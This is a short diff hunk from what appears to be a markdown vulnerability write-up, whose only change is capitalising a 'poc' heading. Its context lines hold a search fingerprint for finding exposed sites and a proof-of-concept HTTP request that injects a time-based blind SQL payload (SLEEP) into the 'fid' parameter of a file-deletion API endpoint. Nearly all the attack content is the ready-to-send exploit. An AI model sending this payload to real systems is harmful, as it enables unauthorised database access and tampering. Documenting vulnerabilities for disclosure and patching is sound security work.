@@ -8,7 +8,7 @@
 body="不要着急，点此"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(2)))UPCw) HTTP/1.1
